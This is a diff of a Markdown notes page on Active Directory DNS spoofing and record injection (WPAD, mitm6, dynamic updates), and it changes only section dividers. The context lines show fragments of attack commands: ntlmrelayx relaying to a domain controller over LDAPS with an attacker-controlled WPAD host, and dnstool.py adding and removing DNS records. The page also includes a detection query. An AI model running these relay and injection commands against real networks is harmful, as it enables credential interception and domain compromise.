@@ -21,7 +21,7 @@ linked:
 ---
 # AD - DNS & SRV Records - DNS Spoofing & Records Injection
 
-***
+---
 
 ## DNS Insecure Dynamic Update
 
@@ -54,7 +54,7 @@ send
 EOF
 ```
 
-___
+---
 
 ## WPAD Attack
 
@@ -85,7 +85,7 @@ ntlmrelayx.py -tf relay_targets.txt -smb2support
 python3 dnstool.py -u 'corp\u' -p pass -a remove -r wpad <DC>
 ```
 
-___
+---
 
 ## mitm6 (IPv6 DHCP Spoofing)
 
@@ -111,7 +111,7 @@ ntlmrelayx.py -6 -t ldaps://<DC> \
   -wh attacker.corp.local
 ```
 
-___
+---
 
 ## DNS Records Injection (Spoofing Targeted)
 
@@ -138,7 +138,7 @@ python3 dnstool.py -u 'corp\u' -p pass -a remove -r dc01 <DC>
 python3 dnstool.py -u 'corp\u' -p pass -a add -r dc01 -d "$ORIG_IP" <DC>
 ```
 
-___
+---
 
 ## Cleanup y Detection
 
@@ -169,4 +169,4 @@ $Suspicious = Get-DnsServerResourceRecord -ZoneName corp.local -ComputerName <DC
 $Suspicious | Select RecordType,HostName,RecordData,Timestamp
 ```
 
-***
+---
